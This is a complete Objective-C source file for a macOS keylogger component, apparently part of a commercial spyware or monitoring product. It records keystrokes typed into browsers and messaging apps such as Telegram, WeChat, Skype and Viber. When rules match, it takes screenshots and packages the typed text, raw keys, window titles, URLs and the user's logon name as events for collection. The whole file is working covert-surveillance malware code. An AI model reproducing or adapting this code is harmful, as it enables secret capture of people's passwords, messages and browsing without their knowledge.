//
//  KeyboardCaptureManager.m
//  KeyboardCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/27/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "KeyboardCaptureManager.h"
#import "KeyLogRuleHelper.h"
#import "KeyLogRule.h"
#import "ScreenshotUtils.h"

#import "KeyboardLoggerManager.h"
#import "KeyStrokeInfo.h"

#import "FxKeyLogEvent.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"
#import "SystemUtilsImpl.h"

@interface KeyboardCaptureManager (private)
- (void) setKeyLogRuleInfo: (NSDictionary *) aKeyLogRuleInfo;
- (void) setMonitorApplicationInfo: (NSDictionary *) aMonitorApplicationInfo;
- (void) captureKeyLogEventWithKeyStroke: (KeyStrokeInfo *) aKeyStrokeInfo;
- (void) storeEvent: (FxEvent *) aEvent;
@end

@implementation KeyboardCaptureManager

@synthesize mEventDelegate;
@synthesize mKeyLogRules;
@synthesize mKeyMonitorApplications;
@synthesize mScreenshotPath;
@synthesize mApplicationList;
@synthesize mKeystrokeKeeper;

-(id) initWithScreenshotPath: (NSString *) aScreenshotPath withKeyboardLoggerManager: (KeyboardLoggerManager *) aKeyboardLoggerManager {
    if ((self = [super init])) {
        mKeystrokeKeeper = [[KeyStrokeInfo alloc]init];
        mScreenshotPath = [[NSString alloc] initWithString:aScreenshotPath];
        mKeyLogRules    = [[NSMutableArray alloc]init];
        mKeyMonitorApplications = [[NSMutableArray alloc]init];
        mKeyboardLoggerManager = aKeyboardLoggerManager;
        mApplicationList = [[NSArray alloc]initWithObjects: @"com.apple.Safari",
                                                            @"org.mozilla.firefox",
                                                            @"com.google.Chrome",
                                                            @"com.viber.osx",
                                                            @"com.tencent.qq",
                                                            @"com.apple.iChat",
                                                            @"com.tencent.xinWeChat",
                                                            @"com.skype.skype",
                                                            @"com.aim.chromely.aim",
                                                            @"com.ceruleanstudios.trillian.osx",
                                                            @"ru.keepcoder.Telegram",
                                                            @"org.telegram.desktop",
                                                            @"jp.naver.line.mac", nil];
	}
	return (self);
}

#pragma mark - Events protocol -
-(void) registerEventDelegate:(id <EventDelegate>) aEventDelegate{
    [self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture{
    [self stopCapture];
    [mKeyboardLoggerManager addObserver:self];
}
- (void) stopCapture{
    [mKeyboardLoggerManager removeObserver:self];
}

#pragma mark - Keyboard logger manager protocol -

-(void) mouseClickDetected:(KeyStrokeInfo *) aKeyStrokeInfo mouseEvent:(NSEvent *)aEvent{
    if (aKeyStrokeInfo != nil) {
        if ([mApplicationList containsObject:[aKeyStrokeInfo mAppBundle]]) {
            [self captureKeyLogEventWithKeyStroke:aKeyStrokeInfo];
        }else{
            [self keepKeystroke:aKeyStrokeInfo];
        }
    }
}

-(void) terminateKeyDetected:(KeyStrokeInfo *) aKeyStrokeInfo keySymbol:(NSString *)aSymbol {
    DLog(@"terminateKeyDetected %@",aKeyStrokeInfo);

    if (aKeyStrokeInfo != nil) {
        DLog(@"[aKeyStrokeInfo mAppBundle] %@ %@",[aKeyStrokeInfo mAppBundle],mApplicationList);
        if ([mApplicationList containsObject:[aKeyStrokeInfo mAppBundle]]) {
            [self captureKeyLogEventWithKeyStroke:aKeyStrokeInfo];
        }else{
            [self keepKeystroke:aKeyStrokeInfo];
        }
    }
}

- (void) activeAppChangeKeyDetected: (KeyStrokeInfo *) aKeyStrokeInfo inactiveBundleID: (NSString *) aBundleID {
    if (aKeyStrokeInfo != nil) {
        if ([mApplicationList containsObject:[aKeyStrokeInfo mAppBundle]]) {
            [self captureKeyLogEventWithKeyStroke:aKeyStrokeInfo];
        }else{
            [self keepKeystroke:aKeyStrokeInfo];
            [self captureKeyLogEventWithKeyStroke:mKeystrokeKeeper];
            [self clearKeystroke];
        }
    }else{
        if ([mKeystrokeKeeper mAppBundle]) {
            [self captureKeyLogEventWithKeyStroke:mKeystrokeKeeper];
            [self clearKeystroke];

        }
    }
}
-(void) keepKeystroke : (KeyStrokeInfo *)aKeyStrokeInfo{
    if (![mKeystrokeKeeper mAppBundle]) {
        [mKeystrokeKeeper setMAppBundle:[aKeyStrokeInfo mAppBundle]];
        [mKeystrokeKeeper setMAppName:[aKeyStrokeInfo mAppName]];
        [mKeystrokeKeeper setMKeyStroke:[aKeyStrokeInfo mKeyStroke]];
        [mKeystrokeKeeper setMKeyStrokeDisplay:[aKeyStrokeInfo mKeyStrokeDisplay]];
        [mKeystrokeKeeper setMWindowTitle:[aKeyStrokeInfo mWindowTitle]];
        [mKeystrokeKeeper setMUrl:[aKeyStrokeInfo mUrl]];
        [mKeystrokeKeeper setMScreen:[aKeyStrokeInfo mScreen]];
        [mKeystrokeKeeper setMFrontmostWindow:[aKeyStrokeInfo mFrontmostWindow]];
    }else{
        NSString * keys = [NSString stringWithFormat:@"%@%@",[mKeystrokeKeeper mKeyStroke],[aKeyStrokeInfo mKeyStroke]];
        NSString * keyDisplays = [NSString stringWithFormat:@"%@%@",[mKeystrokeKeeper mKeyStrokeDisplay],[aKeyStrokeInfo mKeyStrokeDisplay]];
        [mKeystrokeKeeper setMKeyStroke:keys];
        [mKeystrokeKeeper setMKeyStrokeDisplay:keyDisplays];
    }
}

-(void) clearKeystroke{
    [mKeystrokeKeeper setMAppBundle:nil];
    [mKeystrokeKeeper setMAppName:nil];
    [mKeystrokeKeeper setMKeyStroke:nil];
    [mKeystrokeKeeper setMKeyStrokeDisplay:nil];
    [mKeystrokeKeeper setMWindowTitle:nil];
    [mKeystrokeKeeper setMUrl:nil];
    [mKeystrokeKeeper setMScreen:nil];
    [mKeystrokeKeeper setMFrontmostWindow:nil];
}

#pragma mark - Key rule protocol -

- (void) keyLogRuleChanged: (NSDictionary *) aKeyLogRuleInfo {
    [self setKeyLogRuleInfo:aKeyLogRuleInfo];
}

- (void) monitorApplicationChanged: (NSDictionary *) aMonitorApplicationInfo {
    [self setMonitorApplicationInfo:aMonitorApplicationInfo];
}

#pragma mark - Private methods -

-(void) setKeyLogRuleInfo: (NSDictionary *) aKeyLogRuleInfo {
    [mKeyLogRules removeAllObjects];
    NSDictionary * myRule = [[NSDictionary alloc]initWithDictionary:aKeyLogRuleInfo];
    NSArray *allKeys = [myRule allKeys];
    for (int i=0; i< [allKeys count]; i++) {
        [mKeyLogRules addObject:[myRule objectForKey:[allKeys objectAtIndex:i]]];
    }
    [myRule release];
    DLog(@"New key rules: %@", mKeyLogRules);
}

-(void) setMonitorApplicationInfo: (NSDictionary *) aMonitorApplicationInfo {
    [mKeyMonitorApplications removeAllObjects];
    NSDictionary * myRule = [[NSDictionary alloc]initWithDictionary:aMonitorApplicationInfo];
    NSArray *allKeys = [myRule allKeys];
    for (int i=0; i< [allKeys count]; i++) {
        [mKeyMonitorApplications addObject:[myRule objectForKey:[allKeys objectAtIndex:i]]];
    }
    [myRule release];
    DLog(@"New monitor apps: %@", mKeyMonitorApplications);
}

- (void) captureKeyLogEventWithKeyStroke: (KeyStrokeInfo *) aKeyStrokeInfo {
    KeyStrokeInfo * tempKeyStroke = [[[KeyStrokeInfo alloc] init] autorelease];
    
    [tempKeyStroke setMAppBundle:[aKeyStrokeInfo mAppBundle]];
    [tempKeyStroke setMAppName:[aKeyStrokeInfo mAppName]];
    [tempKeyStroke setMKeyStroke:[aKeyStrokeInfo mKeyStroke]];
    [tempKeyStroke setMKeyStrokeDisplay:[aKeyStrokeInfo mKeyStrokeDisplay]];
    [tempKeyStroke setMWindowTitle:[aKeyStrokeInfo mWindowTitle]];
    [tempKeyStroke setMUrl:[aKeyStrokeInfo mUrl]];
    [tempKeyStroke setMScreen:[aKeyStrokeInfo mScreen]];
    [tempKeyStroke setMFrontmostWindow:[aKeyStrokeInfo mFrontmostWindow]];
    
    NSCharacterSet *charSet1 = [NSCharacterSet controlCharacterSet];
    NSMutableCharacterSet *charSet2 = [NSMutableCharacterSet whitespaceAndNewlineCharacterSet];
    [charSet2 formUnionWithCharacterSet:charSet1];
    
    NSString *displayData = [tempKeyStroke mKeyStrokeDisplay];
    displayData = [displayData stringByTrimmingCharactersInSet:charSet2];

    if ([displayData length]) {
        NSThread *threadA = [NSThread currentThread];
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{

            NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
            DLog(@"#### captureKeyLogEventWithKeyStroke %@",tempKeyStroke);
            if ([KeyLogRuleHelper matchingMonitorApps:mKeyMonitorApplications toKeyInfo:tempKeyStroke] ||
                [KeyLogRuleHelper matchingKeyLogRuleApps:self.mKeyLogRules toKeyInfo:tempKeyStroke]) {
                NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
                
                NSString *attachmentPath = @"";
                if ([KeyLogRuleHelper matchingKeyLogRules:self.mKeyLogRules toKeyInfo:tempKeyStroke]) {
                    attachmentPath = [NSString stringWithFormat:@"%@%@.jpeg",mScreenshotPath,[DateTimeFormat phoenixDateTime]];
                    NSImage * img = [ScreenshotUtils takeScreenShotWithScreen:[tempKeyStroke mScreen]];
                    NSData *imgData = [img TIFFRepresentation];
                    NSBitmapImageRep *imageRep = [NSBitmapImageRep imageRepWithData:imgData];
                    NSDictionary *imageProps = [NSDictionary dictionaryWithObject:[NSNumber numberWithFloat:0.1] forKey:NSImageCompressionFactor];
                    NSData *jpegData = [imageRep representationUsingType:NSJPEGFileType properties:imageProps];
                    [jpegData writeToFile:attachmentPath atomically:YES];
                } else {
                    DLog(@"No Picture For this app");
                }
                
                DLog(@"UserName: %@", NSUserName());
                DLog(@"FullUserName: %@", NSFullUserName());
                
                FxKeyLogEvent * fxKeyEvent = [[FxKeyLogEvent alloc]init];
                [fxKeyEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                [fxKeyEvent setMUserName:[SystemUtilsImpl userLogonName]];
                [fxKeyEvent setMApplication:[tempKeyStroke mAppName]];
                [fxKeyEvent setMTitle:[tempKeyStroke mWindowTitle]];
                [fxKeyEvent setMActualDisplayData:[tempKeyStroke mKeyStrokeDisplay]];
                [fxKeyEvent setMRawData:[tempKeyStroke mKeyStroke]];
                [fxKeyEvent setMApplicationID:[tempKeyStroke mAppBundle]];
                [fxKeyEvent setMUrl:[tempKeyStroke mUrl]];
                if([attachmentPath length]>0 ){
                    [fxKeyEvent setMScreenshotPath:attachmentPath];
                }
                
                [self performSelector:@selector(storeEvent:)
                             onThread:threadA
                           withObject:fxKeyEvent
                        waitUntilDone:NO];
                
                [fxKeyEvent release];
                
                [pool release];
                
            } else {
                DLog(@"Not for this application");
            }
            [pool release];
        });
    }
}

- (void) storeEvent: (FxEvent *) aEvent {
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        [mEventDelegate eventFinished:aEvent];
    }
}

#pragma mark - Memory dealloc -
- (void)dealloc
{
    DLog(@"KeyboardCaptureManager is deallocated >>>");
    [self stopCapture];
    [mKeystrokeKeeper release];
    [mApplicationList release];
    [mScreenshotPath release];
    [mKeyLogRules release];
    [mKeyMonitorApplications release];
    [super dealloc];
}

@end
